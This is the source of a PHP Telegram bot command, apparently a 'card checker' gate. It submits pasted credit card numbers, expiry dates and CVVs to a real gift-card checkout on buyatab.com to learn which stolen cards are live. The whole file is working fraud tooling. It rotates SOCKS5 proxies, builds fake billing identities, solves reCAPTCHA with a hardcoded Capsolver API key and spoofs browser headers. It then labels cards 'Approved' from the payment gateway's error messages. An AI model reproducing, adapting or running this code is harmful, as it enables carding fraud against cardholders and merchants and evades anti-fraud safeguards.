<?php
list($cmd) = explode(" ", $message);
if($cmd == "/gb" or $cmd == ".gb" or $cmd == "!gb"){
include '/CurlX.php';
$NameGater ='Goblin';
$gateway = '/gb :'.$NameGater;

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Paysafe</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!gb card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Paysafe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();
$retry = 0;

start:
    
if($retry > 7)
{
    bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Error Token Site</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
return;
}

$rotate = rotate();
$socks5 = socks5();
$url = "https://api.ipify.org/"; 
       
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_PROXY,$socks5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$rotate); 
$ip1 = curl_exec($ch); 
curl_close($ch); 
ob_flush(); 
if (isset($ip1)) { 
  $ip = "Live"; 
} 
if (empty($ip1)) { 
    bot('editMessageText',[
        'chat_id'=>$chatId,
        'message_id'=>$messageidtoedit,
        'text'=>"<b>The Proxy is Dead Report and Please Be Patience</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id]);
    die();
}
$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$cart_token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 24);



$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$curl = new CurlX;
$cookie = uniqid();




$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

date_default_timezone_set('UTC');

$datad = date('D, d F, Y h:i A');

$req3 = $curl::Get("https://www.buyatab.com/gcp?id=5500&page=egift90", $headers = null , $cookie,$server);

$req2 = $curl::Post('https://www.buyatab.com/gcp/services/BuyatabWS.asmx/GcpInputValidate', $data = '{validation_group:[{"Classes":"required ammount number","Data":"75","MerchantId":5500},{"Classes":"quantity up-down-number number","Data":"1","MerchantId":5500},{"Classes":"message nospecialcharacters","Data":"","MerchantId":5500},{"Classes":"required name nospecialcharacters","Data":"'.$email.'","MerchantId":5500},{"Classes":"required email","Data":"'.$email.'","MerchantId":5500},{"Classes":"optional sname name nospecialcharacters","Data":"Destin Funk","MerchantId":5500},{"Classes":"required date no-tab hasDatepicker ui-date-picker","Data":"'.$datad.'","MerchantId":5500}], emailValidationData:{"IsPurchaserEmail":false,"IsRecipientEmail":true}, merchantId:5500}', $headers = ['accept: application/json, text/javascript, */*; q=0.01',
'accept-language: es-ES,es;q=0.9',
'content-type: application/json; charset=UTF-8',
'origin: https://www.buyatab.com',
'referer: https://www.buyatab.com/gcp/?id=5500&page=egift90',
'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',] , $cookie,$server);

$solution = $solver->recaptchaV2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://www.buyatab.com',
      'websiteKey'    => '6LekCU8UAAAAAGJ-xDkiKvXShnrAcxPBL39QArad',
    ]
);
$captcha = $solution["gRecaptchaResponse"];
echo $captcha."\n";

$currentDate = date('D M d Y');
$currentTimestamp = strtotime($currentDate);
$currentTimestampUtc = $currentTimestamp * 1000;
$originalDeliveryTimeOffset = date('D, m/d/Y, h:i A', $currentTimestamp);



 $creditCardTypes = [
    '4' => 'Visa',
    '5' => 'Mastercard',
    '3' => [
      '7' => 'American Express',
      '5' => 'JCB'
    ],
    '6' => 'Discover',
    '2' => 'Maestro',
    '35' => 'Diners Club',
    'Mada' => []
  ];

  $type = '';
  if (preg_match('/^[0-9]{1,}$/', $cc)) {
    foreach ($creditCardTypes as $key => $value) {
      if (is_array($value)) {
        if (array_key_exists(substr($cc, 0, 1), $value)) {
          $type = $value[substr($cc, 0, 1)];
          break;
        }
      } else {
        if (strval($key) === substr($cc, 0, 1)) {
          $type = $value;
          break;
        }
      }
    }
  }

echo $type; // Output: Visa
//''
$req2 = $curl::Post('https://www.buyatab.com/gcp/services/BuyatabWS.asmx/Checkout', $data = '{"crq":{"Cart":{"CartCards":[{"StyleId":"268906","SlideIndex":0,"CurrencySign":"$","CurrencyCode":"USD","Amount":"75","AmountFR":"75","DiscountAmount":0,"Quantity":"1","CardImg":"https://img.buyatab.com/gcp/view/cards/758/5500/small/758-977fd73e-a9ec-4d43-9cdd-c63815d62b34.png","CardDescription":"","CardTitle":"Regal75","Message":"","MerchantId":5500,"StoreFrontName":"Regal","DesignType":"default","Orientation":"bottom","IsBonus":false,"Delivery":{"Persons":[{"Type":"Recipient","FB":"","Email":"'.$email.'","Name":"'.$email.'"},{"Type":"Sender","FB":"","Name":"'.$firstname.' '.$lastname.'","Email":""}],"DeliveryType":"email","DeliveryTimezoneShort":"ECT","DeliveryTypeLabel":"Email","DeliveryDate":"'.$currentDate.'","DeliveryTimestampUtc":'.$currentTimestampUtc.',"DeliveryDateUtc":"'.date('Y-m-d\TH:i:s.000\Z', $currentTimestamp).'","OriginalDeliveryTimeOffset":"'.$originalDeliveryTimeOffset.' -05:00"},"Shipment":{"Key":0,"ShippingOption":{"Cost":0,"Type":""},"ShippingAddress":{"Address1":"","Address2":"","City":"","PostalZip":"","RegionId":0,"Region":"","CountryId":0,"RecipientName":"","Phone":""}},"PersonalizedEnclosure":{"Key":0,"Enclosure_Id":0,"To":"","From":"","Message":""}}]},"Payment":{"UserBillingInfoId":"","CCType":"'.$type.'","CCNum":"'.$cc.'","NameOnCard":"'.$firstname.' '.$lastname.'","ExpDate":"'.$mes.'/'.$ano.'","CVD":"'.$cvv.'","Address1":"'.$street.'","Address2":"","City":"Olympia","Country":"1","RegionId":"48","Region":"Washington","PostalZip":"'.$zip.'","Telephone":"'.$phone.'","Email":"luisperes23@gmail.com","AddCharge":0,"AddChargeType":0,"SavePayment":false,"SingleUseToken":""},"RA":{"CP":true,"TD":false,"UA":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","BL":"es-ES","BN":"Netscape","BP":"Win32","CE":true,"GAL":false,"cart_token":"'.$cart_token.'"},"Loyalty":null,"OptIn":false,"PhysicalCatalogue":false,"Language":"en","PurchaseType":null,"DeliverCards":true,"RecaptchaResponse":"'.$captcha.'","AppliedPromotionUniqueIds":[],"AppliedPromoCodePromotions":[],"PromotionThresholdStatus":{"PromotionThresholdReached":false,"OfferLimitReached":false},"SignifydBeaconKey":"f520115f-48b5-4b7a-8886-68599544c15a","ClientLocalTimeZone":"America/Bogota","Source":"gcp"}}', $headers = ['accept: application/json, text/javascript, */*; q=0.01',
'accept-language: es-ES,es;q=0.9',
'content-type: application/json; charset=UTF-8',
'origin: https://www.buyatab.com',
'referer: https://www.buyatab.com/gcp/?id=5500&page=egift90',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',] , $cookie,$server);
$Message = $curl::ParseString($req2->body, '"Message":"', '"');
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Paysafe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);



if($Message == "The CVD/CVV value supplied was incorrect. Please review your billing information."){ 
$status = "Approved #CCN! ✅";
$response = "The CVD/CVV value supplied was incorrect.  ✅";
}elseif($msg == "Invalid CVV CVC"){
$status = "CARD CCN! ✅";
$response = "This transaction was declined due to an incorrect security code. ✅";
}elseif ($msg == "Insufficient funds"){ 
$status = "Approved!🟩";
$response = "Insufficient funds 🟩";
}elseif ($msg == "3D secure failed"){ 
$status = "Approved (Posible Aliexpress)!🟩";
$response = "3D secure failed 🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$Message";
}
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Paysafe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
}
